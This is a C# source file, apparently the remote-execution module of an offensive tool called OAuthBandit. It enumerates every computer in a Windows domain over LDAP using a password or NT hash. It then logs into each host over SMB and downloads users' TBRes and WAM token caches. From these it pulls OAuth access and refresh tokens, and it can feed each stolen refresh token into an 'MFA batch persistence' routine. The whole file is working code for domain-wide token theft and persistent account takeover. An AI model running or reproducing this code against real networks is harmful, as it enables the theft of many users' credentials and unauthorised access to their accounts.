using System.Collections.Concurrent;
using System.Diagnostics;
using System.Text;
using System.Text.Json;
using OAuthBandit.Core;
using OAuthBandit.Extractors;
using OAuthBandit.Mfa;

namespace OAuthBandit.Remote;

public class RemoteExecutor
{
    private readonly string _dcIp;
    private readonly string _domain;
    private readonly string _username;
    private readonly string? _password;
    private readonly string? _nthash;
    private readonly int _threads;
    private readonly string _outputDir;
    private readonly bool _autoMfa;
    private readonly double _mfaDelay;
    private readonly int _retry;
    private readonly string _tempDir;
    private readonly ConcurrentBag<MachineResult> _results = new();
    private readonly ConcurrentBag<Dictionary<string, object>> _allTokens = new();
    private int _done;
    private int _success;
    private int _failed;
    private int _tokensFound;
    private int _rtFound;
    private readonly Stopwatch _sw = new();

    public RemoteExecutor(string dcIp, string domain, string username,
        string? password = null, string? nthash = null, int threads = 10,
        string outputDir = ".", bool autoMfa = false, double mfaDelay = 2.0, int retry = 1)
    {
        _dcIp = dcIp;
        _domain = domain;
        _username = username;
        _password = password;
        _nthash = nthash;
        _threads = threads;
        _outputDir = outputDir;
        _autoMfa = autoMfa;
        _mfaDelay = mfaDelay;
        _retry = retry;
        _tempDir = Path.Combine(Path.GetTempPath(), $"ob_{Guid.NewGuid():N}");
        Directory.CreateDirectory(_tempDir);
    }

    public Dictionary<string, object?> Run(List<string>? targetComputers = null)
    {
        _sw.Start();

        Console.WriteLine();
        Console.WriteLine("  OAuthBandit - DOMAIN EXTRACTION");
        Console.WriteLine($"  Target: {_domain} | DC: {_dcIp}");
        Console.WriteLine($"  Threads: {_threads} | Retry: {_retry}");
        if (_autoMfa) Console.WriteLine($"  MFA: ENABLED (delay: {_mfaDelay}s between requests)");
        Console.WriteLine($"{"".PadRight(70, '=')}");

        // Phase 1: LDAP
        var computers = PhaseLdap(targetComputers);
        if (computers.Count == 0) return new() { ["error"] = "No computers found" };

        // Phase 2: SMB Collection
        PhaseSmbCollect(computers);

        // Phase 3: Report
        var report = PhaseReport();

        // Phase 4: MFA Batch
        if (_autoMfa && _allTokens.Any())
            PhaseMfaBatch();

        return report;
    }

    private List<string> PhaseLdap(List<string>? targetComputers)
    {
        Console.WriteLine($"\n[PHASE 1/3] LDAP Enumeration");
        Console.WriteLine(new string('-', 50));

        if (targetComputers != null && targetComputers.Count > 0)
        {
            Console.WriteLine($"[*] Using {targetComputers.Count} manually specified target(s)");
            return targetComputers;
        }

        Console.WriteLine($"[*] Connecting to LDAP: {_dcIp}");
        using var ldap = new LdapEnumerator(_dcIp, _domain, _username, _password, _nthash);

        if (!ldap.Connect()) return new();

        var computers = ldap.GetComputers();
        var users = ldap.GetDomainUsers();

        var targets = computers.Select(c => !string.IsNullOrEmpty(c.DnsHostname) ? c.DnsHostname : c.Name)
            .Where(h => !string.IsNullOrEmpty(h)).ToList();

        Console.WriteLine($"[+] {targets.Count} computers | {users.Count} domain users");
        return targets;
    }

    private void PhaseSmbCollect(List<string> targets)
    {
        Console.WriteLine($"\n[PHASE 2/3] SMB Collection ({targets.Count} targets)");
        Console.WriteLine(new string('-', 50));

        var total = targets.Count;

        Parallel.ForEach(targets, new ParallelOptions { MaxDegreeOfParallelism = _threads }, hostname =>
        {
            MachineResult result;
            try { result = CollectMachine(hostname); }
            catch (Exception ex)
            {
                result = new MachineResult { Hostname = hostname, Status = "failed", Error = $"Thread error: {ex.Message[..Math.Min(ex.Message.Length, 100)]}" };
            }

            _results.Add(result);
            var d = Interlocked.Increment(ref _done);
            if (result.Status is "success" or "partial") Interlocked.Increment(ref _success);
            else Interlocked.Increment(ref _failed);
            Interlocked.Add(ref _tokensFound, result.TokensExtracted);
            Interlocked.Add(ref _rtFound, result.RefreshTokens);

            var icon = result.Status is "success" or "partial" ? "+" : "-";
            var tokInfo = result.TokensExtracted > 0
                ? $" | {result.TokensExtracted} tokens" + (result.RefreshTokens > 0 ? $" ({result.RefreshTokens} RT!)" : "")
                : "";
            Console.WriteLine($"    [{icon}] [{d}/{total}] {result.Hostname} | {result.UsersFound} users | {result.TbresFiles} tbres{tokInfo} | {result.DurationSeconds:F1}s");

            if (d % 25 == 0 || d == total)
            {
                var elapsed = _sw.Elapsed.TotalSeconds;
                var rate = d / elapsed;
                var eta = rate > 0 ? (total - d) / rate : 0;
                Console.WriteLine($"        >>> Progress: {d}/{total} ({_success} OK, {_failed} fail) | {_tokensFound} tokens | {_rtFound} RT | ETA: {eta:F0}s");
            }
        });
    }

    private MachineResult CollectMachine(string hostname)
    {
        var result = new MachineResult { Hostname = hostname };
        var sw = Stopwatch.StartNew();

        for (int attempt = 1; attempt <= _retry; attempt++)
        {
            using var smb = new SmbClient(hostname, _username, _password, _domain, _nthash);

            if (!smb.Connect())
            {
                if (attempt < _retry) { Thread.Sleep(2000); continue; }
                result.Status = "unreachable";
                result.Error = "SMB connection failed";
                result.DurationSeconds = sw.Elapsed.TotalSeconds;
                return result;
            }

            try
            {
                var users = smb.ListUsers();
                result.UsersFound = users.Count;

                var machineDir = Path.Combine(_tempDir, hostname);
                Directory.CreateDirectory(machineDir);

                foreach (var user in users)
                {
                    var tbres = smb.DownloadTbresFiles(user, machineDir);
                    var wam = smb.DownloadWamFiles(user, machineDir);
                    result.TbresFiles += tbres.Count;
                    result.WamFiles += wam.Count;

                    // parse downloaded files for tokens
                    foreach (var file in tbres.Concat(wam))
                    {
                        try
                        {
                            var tokens = ParseDownloadedFile(file);
                            foreach (var t in tokens)
                            {
                                _allTokens.Add(new Dictionary<string, object>
                                {
                                    ["type"] = t.TokenType,
                                    ["value"] = t.TokenValue,
                                    ["upn"] = t.Upn ?? "",
                                    ["tenant_id"] = t.TenantId ?? "common",
                                    ["client_id"] = t.ClientId ?? "",
                                    ["app"] = t.Application
                                });
                                if (t.TokenType == "refresh_token") Interlocked.Increment(ref _rtFound);
                            }
                            result.TokensExtracted += tokens.Count;
                            result.RefreshTokens += tokens.Count(t => t.TokenType == "refresh_token");
                            result.AccessTokens += tokens.Count(t => t.TokenType == "access_token");
                        }
                        catch { }
                    }

                    result.Users.Add(new Dictionary<string, object>
                    {
                        ["username"] = user, ["tbres"] = tbres.Count, ["wam"] = wam.Count
                    });
                }

                result.Status = result.TbresFiles + result.WamFiles > 0 ? "success" : "partial";
                break;
            }
            catch (Exception ex)
            {
                if (attempt < _retry) { Thread.Sleep(2000); continue; }
                result.Status = "failed";
                result.Error = ex.Message[..Math.Min(ex.Message.Length, 200)];
            }
        }

        result.DurationSeconds = sw.Elapsed.TotalSeconds;
        return result;
    }

    private Dictionary<string, object?> PhaseReport()
    {
        Console.WriteLine($"\n[PHASE 3/3] Consolidated Report");
        Console.WriteLine(new string('=', 70));

        var results = _results.ToList();
        var successful = results.Where(r => r.Status is "success" or "partial").ToList();
        var unreachable = results.Where(r => r.Status == "unreachable").ToList();
        var failedList = results.Where(r => r.Status == "failed").ToList();

        var totalTbres = successful.Sum(r => r.TbresFiles);
        var totalWam = successful.Sum(r => r.WamFiles);
        var totalUsers = successful.Sum(r => r.UsersFound);

        Console.WriteLine($@"
  Domain:        {_domain}
  DC:            {_dcIp}
  Duration:      {_sw.Elapsed.TotalSeconds:F1}s

  Computers:     {results.Count} total
    Accessible:  {successful.Count}
    Unreachable: {unreachable.Count}
    Failed:      {failedList.Count}

  Users:         {totalUsers} profiles found
  Files:         {totalTbres} TBRes + {totalWam} WAM = {totalTbres + totalWam} total
  Downloaded:    {_tempDir}
");

        var report = new Dictionary<string, object?>
        {
            ["_description"] = "OAuthBandit Domain Extraction Report",
            ["metadata"] = new Dictionary<string, object?>
            {
                ["generated_at"] = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ"),
                ["tool"] = "OAuthBandit", ["version"] = "2.0",
                ["domain"] = _domain, ["dc_ip"] = _dcIp,
                ["duration_seconds"] = Math.Round(_sw.Elapsed.TotalSeconds, 1)
            },
            ["summary"] = new Dictionary<string, object?>
            {
                ["computers_total"] = results.Count,
                ["computers_accessible"] = successful.Count,
                ["computers_unreachable"] = unreachable.Count,
                ["computers_failed"] = failedList.Count,
                ["users_found"] = totalUsers,
                ["files_collected"] = new Dictionary<string, int> { ["tbres"] = totalTbres, ["wam"] = totalWam }
            },
            ["machines"] = results.Select(r => new Dictionary<string, object?>
            {
                ["hostname"] = r.Hostname, ["status"] = r.Status,
                ["users_found"] = r.UsersFound,
                ["files"] = new Dictionary<string, int> { ["tbres"] = r.TbresFiles, ["wam"] = r.WamFiles },
                ["duration_seconds"] = Math.Round(r.DurationSeconds, 1),
                ["error"] = r.Error
            }).ToList()
        };

        var exportDir = Path.Combine(_outputDir, "export");
        Directory.CreateDirectory(exportDir);
        var reportFile = Path.Combine(exportDir, $"domain_{_domain}_{DateTime.Now:yyyyMMdd_HHmmss}.json");
        File.WriteAllText(reportFile, JsonSerializer.Serialize(report, new JsonSerializerOptions { WriteIndented = true }));
        Console.WriteLine($"[+] Report exported to: {reportFile}");

        if (unreachable.Count > 0)
        {
            Console.WriteLine($"\n[!] Unreachable ({unreachable.Count}):");
            foreach (var r in unreachable.Take(5)) Console.WriteLine($"    - {r.Hostname}");
            if (unreachable.Count > 5) Console.WriteLine($"    ... +{unreachable.Count - 5} more");
        }

        return report;
    }

    private void PhaseMfaBatch()
    {
        var rtTokens = _allTokens.Where(t => t.TryGetValue("type", out var tp) && tp?.ToString() == "refresh_token").ToList();
        if (rtTokens.Count == 0) return;

        var seen = new HashSet<string>();
        var unique = rtTokens.Where(t =>
        {
            var upn = t.TryGetValue("upn", out var u) ? u?.ToString() ?? "" : "";
            return !string.IsNullOrEmpty(upn) && seen.Add(upn);
        }).ToList();

        Console.WriteLine($"\n{"".PadRight(70, '=')}");
        Console.WriteLine($"  MFA BATCH PERSISTENCE");
        Console.WriteLine($"  {unique.Count} unique accounts with refresh tokens");
        Console.WriteLine($"  Rate limit: {_mfaDelay}s delay between requests");
        Console.WriteLine($"{"".PadRight(70, '=')}");

        var mfa = new MfaManager(_outputDir);
        for (int i = 0; i < unique.Count; i++)
        {
            var t = unique[i];
            Console.WriteLine($"\n[MFA {i + 1}/{unique.Count}]");
            mfa.ProcessRefreshToken(
                t.TryGetValue("value", out var v) ? v?.ToString() ?? "" : "",
                t.TryGetValue("upn", out var u) ? u?.ToString() ?? "unknown" : "unknown",
                t.TryGetValue("tenant_id", out var tid) ? tid?.ToString() ?? "common" : "common"
            );
            if (i < unique.Count - 1) Thread.Sleep((int)(_mfaDelay * 1000));
        }

        if (mfa.Results.Count > 0) mfa.ExportResults();
    }

    private static List<Token> ParseDownloadedFile(string filePath)
    {
        var tokens = new List<Token>();
        try
        {
            var raw = File.ReadAllBytes(filePath);
            if (raw.Length < 20) return tokens;
            var text = Encoding.UTF8.GetString(raw);

            // extract JWTs
            foreach (System.Text.RegularExpressions.Match m in Constants.JwtPattern.Matches(text))
            {
                var jwt = m.Groups[1].Value;
                tokens.Add(new Token { TokenType = "access_token", TokenValue = jwt, Application = "remote", SourceFile = Path.GetFileName(filePath) });
            }

            // extract refresh tokens
            foreach (System.Text.RegularExpressions.Match m in Constants.RefreshTokenPattern.Matches(text))
            {
                var rt = m.Groups[1].Value;
                if (rt.Length > 200)
                    tokens.Add(new Token { TokenType = "refresh_token", TokenValue = rt, Application = "remote", SourceFile = Path.GetFileName(filePath) });
            }
        }
        catch { }
        return tokens;
    }

    public void Cleanup()
    {
        try { if (Directory.Exists(_tempDir)) Directory.Delete(_tempDir, true); } catch { }
    }
}
